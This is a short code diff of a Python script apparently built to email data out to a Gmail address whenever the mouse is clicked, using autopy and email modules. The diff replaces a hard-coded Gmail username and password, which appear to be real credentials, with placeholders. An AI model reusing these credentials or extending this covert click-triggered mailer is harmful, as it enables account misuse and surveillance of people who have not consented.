@@ -7,8 +7,8 @@ import email.encoders
 import os
 import autopy
 
-gmail_user ='justforhustle001@gmail.com'
-gmail_pwd ='Hustle123456'
+gmail_user ='ChoosenMailAddress@gmail.com'
+gmail_pwd ='Password'
 
 def on_click(x, y, button, pressed):
     mail("justforhustle001@gmail.com",
